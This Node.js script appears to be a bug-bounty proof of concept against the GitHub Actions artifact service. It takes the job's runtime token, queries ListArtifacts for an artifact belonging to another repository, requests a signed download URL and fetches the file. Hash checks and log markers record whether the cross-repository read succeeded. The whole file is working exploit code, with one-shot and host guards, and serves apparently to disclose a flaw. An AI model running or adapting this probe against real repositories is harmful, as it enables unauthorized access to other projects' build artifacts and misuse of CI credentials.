'use strict'

const crypto = require('crypto')

const DONOR_ARTIFACT_ID = '10529712104'
const DONOR_ARTIFACT_NAME = 'donor-pages'
const DONOR_ARTIFACT_BYTES = 316
const DONOR_ARTIFACT_SHA256 = '0ec9e571495dcec02b889634562a0552ff46d7fe9f64b050513d51fb195396bd'
const MAX_RESPONSE_BYTES = 1024 * 1024
const SERVICE = 'github.actions.results.api.v1.ArtifactService'

function marker(name, level = 'notice') {
  process.stderr.write(`::${level}::${name}_20260918_R7_A4D2\n`)
}

function decodeBackendIds(token) {
  const parts = token.split('.')
  if (parts.length < 2) throw new Error('invalid runtime credential shape')

  const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'))
  const scopes = Array.isArray(payload.scp) ? payload.scp : String(payload.scp || '').split(' ')

  for (const scope of scopes) {
    const fields = String(scope).split(':')
    if (fields[0] === 'Actions.Results' && fields.length === 3) {
      return { workflowRunBackendId: fields[1], workflowJobRunBackendId: fields[2] }
    }
  }

  throw new Error('missing results scope')
}

function field(object, snakeName, camelName) {
  return object && (object[snakeName] ?? object[camelName])
}

async function readBounded(response) {
  const declared = Number(response.headers.get('content-length') || 0)
  if (declared > MAX_RESPONSE_BYTES) throw new Error('response too large')

  const chunks = []
  let total = 0
  for await (const chunk of response.body) {
    const buffer = Buffer.from(chunk)
    total += buffer.length
    if (total > MAX_RESPONSE_BYTES) throw new Error('response too large')
    chunks.push(buffer)
  }
  return Buffer.concat(chunks)
}

async function postJson(origin, path, token, body) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(new URL(path, origin), {
      method: 'POST',
      headers: {
        authorization: `Bearer ${token}`,
        'content-type': 'application/json'
      },
      body: JSON.stringify(body),
      redirect: 'error',
      signal: controller.signal
    })
    const raw = await readBounded(response)
    let parsed = null
    try {
      parsed = JSON.parse(raw.toString('utf8'))
    } catch (_) {
      parsed = null
    }
    return { status: response.status, body: parsed }
  } finally {
    clearTimeout(timer)
  }
}

async function fetchArtifact(signedUrl) {
  const url = new URL(signedUrl)
  if (
    url.protocol !== 'https:' ||
    !url.hostname.endsWith('.blob.core.windows.net') ||
    url.username !== '' ||
    url.password !== '' ||
    url.port !== ''
  ) {
    throw new Error('unexpected artifact host')
  }

  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(url, { redirect: 'error', signal: controller.signal })
    if (response.status !== 200) throw new Error('artifact read rejected')
    return readBounded(response)
  } finally {
    clearTimeout(timer)
  }
}

async function liveProbe() {
  if (process.env.PAGES_BBP_LIVE_ARTIFACT_PROBE !== '1') {
    throw new Error('live guard missing')
  }
  if (process.env.GITHUB_RUN_NUMBER !== process.env.PAGES_BBP_EXPECTED_RUN || process.env.GITHUB_RUN_ATTEMPT !== '1') {
    marker('PAGES_RESULTS_ONE_SHOT_GUARD_MISS')
    return
  }

  let runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || ''
  delete process.env.ACTIONS_RUNTIME_TOKEN
  const resultsUrl = new URL(process.env.ACTIONS_RESULTS_URL || '')
  if (
    resultsUrl.protocol !== 'https:' ||
    !resultsUrl.hostname.endsWith('.actions.githubusercontent.com') ||
    resultsUrl.username !== '' ||
    resultsUrl.password !== '' ||
    resultsUrl.port !== ''
  ) {
    throw new Error('unexpected results service host')
  }

  const ids = decodeBackendIds(runtimeToken)
  const listPath = `/twirp/${SERVICE}/ListArtifacts`
  const baseline = await postJson(resultsUrl.origin, listPath, runtimeToken, {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId
  })

  if (baseline.status !== 200 || !Array.isArray(baseline.body?.artifacts)) {
    marker('PAGES_RESULTS_BASELINE_FAILED')
    runtimeToken = ''
    return
  }
  marker('PAGES_RESULTS_BASELINE_OK')

  const filtered = await postJson(resultsUrl.origin, listPath, runtimeToken, {
    workflow_run_backend_id: ids.workflowRunBackendId,
    workflow_job_run_backend_id: ids.workflowJobRunBackendId,
    id_filter: DONOR_ARTIFACT_ID
  })

  if (filtered.status !== 200 || !Array.isArray(filtered.body?.artifacts)) {
    runtimeToken = ''
    marker('PAGES_RESULTS_DONOR_QUERY_FAILED')
    return
  }

  const donor = filtered.body.artifacts.find(item => String(field(item, 'database_id', 'databaseId')) === DONOR_ARTIFACT_ID)
  if (!donor) {
    runtimeToken = ''
    marker('PAGES_RESULTS_CROSS_REPO_ARTIFACT_REJECTED')
    return
  }

  if (field(donor, 'name', 'name') !== DONOR_ARTIFACT_NAME) {
    runtimeToken = ''
    marker('PAGES_RESULTS_CROSS_REPO_METADATA_MISMATCH', 'warning')
    return
  }
  marker('PAGES_RESULTS_CROSS_REPO_METADATA_ACCEPTED', 'warning')

  const signed = await postJson(resultsUrl.origin, `/twirp/${SERVICE}/GetSignedArtifactURL`, runtimeToken, {
    workflow_run_backend_id: field(donor, 'workflow_run_backend_id', 'workflowRunBackendId'),
    workflow_job_run_backend_id: field(donor, 'workflow_job_run_backend_id', 'workflowJobRunBackendId'),
    name: DONOR_ARTIFACT_NAME
  })
  runtimeToken = ''

  const signedUrl = field(signed.body, 'signed_url', 'signedUrl')
  if (signed.status !== 200 || typeof signedUrl !== 'string' || signedUrl.length === 0) {
    marker('PAGES_RESULTS_CROSS_REPO_SIGNED_URL_REJECTED')
    return
  }
  marker('PAGES_RESULTS_CROSS_REPO_SIGNED_URL_ACCEPTED', 'warning')

  const artifact = await fetchArtifact(signedUrl)
  const digest = crypto.createHash('sha256').update(artifact).digest('hex')
  if (artifact.length === DONOR_ARTIFACT_BYTES && digest === DONOR_ARTIFACT_SHA256) {
    marker('PAGES_RESULTS_CROSS_REPO_MARKER_ARTIFACT_READ_ACCEPTED', 'warning')
  } else {
    marker('PAGES_RESULTS_CROSS_REPO_ARTIFACT_HASH_MISMATCH', 'warning')
  }
}

function selfTest() {
  const payload = Buffer.from(JSON.stringify({ scp: 'Actions.ExampleScope Actions.Results:run-id:job-id' })).toString('base64url')
  const ids = decodeBackendIds(`x.${payload}.x`)
  if (ids.workflowRunBackendId !== 'run-id' || ids.workflowJobRunBackendId !== 'job-id') {
    throw new Error('scope parser self-test failed')
  }
  process.stdout.write('SELF_TEST_OK\n')
}

if (process.argv.includes('--self-test')) {
  selfTest()
} else {
  liveProbe().catch(() => {
    marker('PAGES_RESULTS_PROBE_ABORTED')
    process.exitCode = 1
  })
}
